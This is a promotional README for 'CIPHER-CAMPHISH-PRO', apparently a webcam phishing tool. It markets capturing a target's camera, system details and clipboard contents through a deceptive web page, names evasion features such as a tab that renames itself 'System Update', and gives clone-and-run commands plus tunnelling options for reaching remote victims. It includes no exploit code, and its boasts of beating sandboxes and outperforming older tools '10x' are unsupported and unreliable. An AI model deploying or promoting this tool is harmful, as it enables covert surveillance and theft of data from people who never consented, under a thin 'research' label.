### 🌌 EXECUTIVE OVERVIEW
**CIPHER-CAMPHISH-PRO** is not merely a webcam interaction tool. Developed by **Biruk Getachew (CIPHER)**, it is a **Sovereign-Grade** research engine engineered to bypass modern browser security sandboxes. It aggregates deep system intelligence, high-fidelity media, and sensitive metadata in real-time. Designed to outperform legacy frameworks by a 10x magnitude, it represents the zenith of architectural reconnaissance.

### 🚀 DEPLOYMENT PROTOCOL

**CIPHER-CAMPHISH-PRO** is cross-platform and optimized for Linux, Termux, and Windows environments.

```bash
# Clone the Sovereign Repository
git clone https://github.com/cipher-attack/camphish-pro.git

# Enter the Neural Node
cd camphish-pro

# Initialize Environmental Dependencies
./cipher.sh
```

> **Pro-Tip:** For optimal results, select **Choice 3 [Localhost]** for testing or **Choice 1 [Cloudflared]** for remote research nodes.

###  WHY CIPHER?
Traditional tools are static. **CIPHER** is an evolving ecosystem. It analyzes the entire digital footprint of a target. From a "Ghost Engine" that renames its tab to "System Update" when hidden, to a neural logic that harvests buffers upon focus—this is not just code; it is architecture-level reconnaissance designed for the elite.
